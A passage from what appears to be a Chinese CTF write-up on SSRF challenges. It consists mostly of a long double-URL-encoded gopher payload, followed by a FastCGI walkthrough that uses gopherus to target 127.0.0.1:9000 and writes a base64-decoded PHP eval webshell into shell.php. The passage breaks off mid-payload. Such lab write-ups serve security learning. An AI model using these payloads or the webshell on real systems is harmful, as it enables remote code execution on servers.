class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p>然后提交，出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950398.png"></p><h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><p>给了一个附件，实际上是一篇CSDN文章</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950828.png"></p><p>这里我们不按附件做，当一回脚本小子，这里推荐一个工具gopherus，这个工具可以用gopher协议去干很多事（见下图），包括这一题的fastcgi和下一题的redis</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950416.png"></p><p>我们先用base64加密一句话木马，一会要用</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950640.png"></p><p>因为gopherus需要python2环境，所以在kali里下载使用。</p><p>这里我们用gopherus构造payload。</p><p>启动gopherus，攻击fastcgi，</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./gopherus.py</span> <span class="hljs-params">--exploit</span> fastcgi<br></code></pre></td></tr></table></figure><p>提供一个已知的php文件，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php<br></code></pre></td></tr></table></figure><p>写上我们想在终端执行的命令：在shell.php中写上一句话木马（便于蚁剑连接）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;</span> | <span class="hljs-built_in">base64</span> -d &gt; shell.php<br></code></pre></td></tr></table></figure><p>有人会问我们为什么要先base64编码一句话木马，然后解码写入文件内，</p><p>其实是因为直接写入是不行的。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950906.png"></p><p>这样就生成payload了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950504.png"></p><p>复制payload，gopherus生成的payload只有一次URL编码，这里我们得在bp里再来一次</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950150.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>/_<span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%56</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%46</span><span class="hljs-variable">%54</span><span class="hljs-variable">%57</span><span class="hljs-variable">%41</span><span class="hljs-variable">%52</span><span class="hljs-variable">%45</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%66</span><span class="hljs-variable">%63</span><span class="hljs-variable">%67</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span 